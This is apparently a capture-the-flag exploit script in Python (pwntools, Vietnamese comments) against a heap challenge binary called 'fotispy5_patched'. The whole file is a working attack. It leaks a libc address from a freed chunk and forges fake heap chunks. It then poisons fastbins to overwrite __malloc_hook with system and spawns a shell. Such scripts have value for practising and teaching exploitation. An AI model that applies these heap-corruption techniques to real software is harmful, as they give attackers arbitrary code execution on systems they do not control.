#!/usr/bin/env python3

from pwn import *

exe = ELF("./fotispy5_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-2.23.so", checksec=False)

context.binary = exe

p = process(exe.path)
# p = remote("addr", 1337)


def add_song(size, data=b'abcd'):
    p.sendlineafter(b'Choice: ', str(2))
    p.sendlineafter(b'be: ', str(size))
    p.sendlineafter(b'comment: ', data)

def edit_comment(idx, size, data):
    p.sendlineafter(b'Choice: ', str(3))
    p.sendlineafter(b'select: ', str(idx))
    p.sendlineafter(b'be: ', str(size))
    p.sendlineafter(b'comment: ', data)

def delete(idx):
    p.sendlineafter(b'Choice: ', str(4))
    p.sendlineafter(b'select: ', str(idx))

def show(idx):
    p.sendlineafter(b'Choice: ', str(6))
    p.sendlineafter(b'select: ', str(idx))

# tạo 3 chunk để sửa fastbin và fake chunk trong chunk 3
for i in range(3):
    add_song(0x10)

payload = b'\0'*0x13 + p64(0) + p64(0x21) # khởi tạo top fake chunk
add_song(0x200, payload) # 3
add_song(0x10) # 4
add_song(0x60) # 5
add_song(0x60) # 6

delete(3)
# leak 3 byte đầu của main arena
show(3)
p.recvuntil(b'You Song has ')
leak1 = int(p.recvuntil(b' likes', drop=True), 10)
p.recvuntil(b'You Song has ')
leak2 = int(p.recvuntil(b' dislikes', drop=True), 10)
p.recvuntil(b'You Song is ')
leak3 = int(p.recvuntil(b' seconds', drop=True), 10)

# fake chunk
payload = b''
payload = payload.ljust(0x10, b'\0') + p64(0x210)
payload = payload.ljust(0x1b, b'\0') + p64(0x21)
edit_comment(2, 0x23, payload)

# tạo linking
delete(0)
delete(1)
# sửa thành địa chỉ fake chunk
payload = p64(0)*2 + p64(0x21) + p8(0x6b)
edit_comment(0, 0x19, payload)

add_song(0x10) # 7
add_song(0x10) # 8
show(8)
#leak 3 byte cuối của main arena
p.recvuntil(b'You Song has ')
leak4 = int(p.recvuntil(b' likes', drop=True), 10)
p.recvuntil(b'You Song has ')
leak5 = int(p.recvuntil(b' dislikes', drop=True), 10)
p.recvuntil(b'You Song is ')
leak6 = int(p.recvuntil(b' seconds', drop=True), 10)

leaks = [leak1, leak2, leak3, leak4, leak5, leak6]
libc_leak = int.from_bytes(bytes(leaks), "little")
libc.address = libc_leak - 0x3c4b78
log.info("Libc base: " + hex(libc.address))
malloc_hook = libc.sym.__malloc_hook

# tạo linking để overwrite __malloc_hook
delete(5)
delete(6)
payload = b'\0'*0x60 + p64(0x71) + p64(malloc_hook - 0x23) # tính toán sao cho chunk được malloc có size hợp lý
edit_comment(5, 0x70, payload)

add_song(0x60)
add_song(0x60, b'\0'*0xb + p64(libc.sym.system))
p.sendlineafter(b'Choice: ', str(8)) # system("/bin/sh")

p.interactive()
